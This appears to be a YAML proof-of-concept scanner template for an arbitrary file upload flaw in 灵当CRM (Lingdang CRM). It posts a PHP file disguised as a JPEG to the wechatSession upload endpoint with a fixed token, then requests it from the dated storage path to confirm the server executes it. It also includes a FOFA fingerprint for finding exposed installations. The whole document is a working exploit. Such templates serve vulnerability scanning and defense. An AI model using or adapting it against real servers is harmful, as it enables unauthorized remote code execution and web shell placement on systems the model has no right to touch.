id: poc-yaml-51mis-crm-wechatsession-anyfile-upload
info:
  name: 灵当CRM wechatSession 任意文件上传漏洞
  severity: critical
  tags:
  - 文件上传
  finger: 灵当CRM
  fofa: body="include/js/ldAjax.js"
variables:
  t1: random_int(1000,10000)
  t2: md5(t1)
  dt1: datetime("2006")
  dt2: datetime("01")
  dt3: datetime("02")
requests:
- method: POST
  path: /crm/wechatSession/index.php?token=9b06a9617174f1085ddcfb4ccdb6837f&msgid=1&operation=upload
  headers:
    Content-Type: multipart/form-data; boundary=9f57d14038b72104f2b6fafebf51c117
  data: '--9f57d14038b72104f2b6fafebf51c117

    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"

    Content-Type: image/jpeg


    <?php echo md5({{.t1}});?>

    --9f57d14038b72104f2b6fafebf51c117--'
  expression: status_code == 200 && contains(body,"\"upload_status\":true")
- method: GET
  path: /crm/storage/wechatsession/{{.dt1}}/{{.dt2}}/{{.dt3}}/{{.t1}}.php
  expression: status_code == 200 && body == t2
transport: http
